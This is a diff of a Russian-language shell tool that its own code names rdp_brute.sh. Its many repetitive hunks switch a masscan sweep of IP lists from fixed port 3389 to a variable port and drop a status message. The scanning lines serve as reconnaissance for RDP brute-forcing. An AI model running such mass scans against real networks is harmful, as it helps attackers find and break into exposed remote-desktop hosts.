@@ -8470,7 +8474,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8504,7 +8508,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8519,7 +8523,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8553,7 +8557,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8568,7 +8572,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8602,7 +8606,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8617,7 +8621,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8651,7 +8655,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8666,7 +8670,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8700,7 +8704,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8715,7 +8719,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8749,7 +8753,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8764,7 +8768,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8798,7 +8802,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8813,7 +8817,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8845,7 +8849,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8860,7 +8864,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8893,7 +8897,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8908,7 +8912,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8941,7 +8945,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8956,7 +8960,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8989,7 +8993,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9004,7 +9008,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9037,7 +9041,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9052,7 +9056,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9085,7 +9089,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9100,7 +9104,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9133,7 +9137,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9148,7 +9152,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9181,7 +9185,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9196,7 +9200,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9230,7 +9234,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9245,7 +9249,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9279,7 +9283,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9294,7 +9298,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9327,7 +9331,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9342,7 +9346,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9375,7 +9379,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9390,7 +9394,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9423,7 +9427,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9438,7 +9442,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9472,7 +9476,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9487,7 +9491,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9520,7 +9524,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9535,7 +9539,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9569,7 +9573,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9584,7 +9588,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9618,7 +9622,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9633,7 +9637,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9666,7 +9670,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9681,7 +9685,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9715,7 +9719,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9730,7 +9734,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9764,7 +9768,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9779,7 +9783,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9813,7 +9817,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9828,7 +9832,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9862,7 +9866,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9877,7 +9881,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9911,7 +9915,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9926,7 +9930,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -9960,7 +9964,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -9975,7 +9979,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10008,7 +10012,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10023,7 +10027,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10056,7 +10060,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10071,7 +10075,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10105,7 +10109,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10120,7 +10124,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10153,7 +10157,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10168,7 +10172,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10201,7 +10205,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10216,7 +10220,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10249,7 +10253,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10264,7 +10268,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10297,7 +10301,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10312,7 +10316,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10345,7 +10349,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10360,7 +10364,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10394,7 +10398,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10409,7 +10413,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10442,7 +10446,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10457,7 +10461,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10491,7 +10495,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10506,7 +10510,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10540,7 +10544,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -10555,7 +10559,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10596,7 +10600,7 @@ echo -e "$red-------------------------------------------------------------------
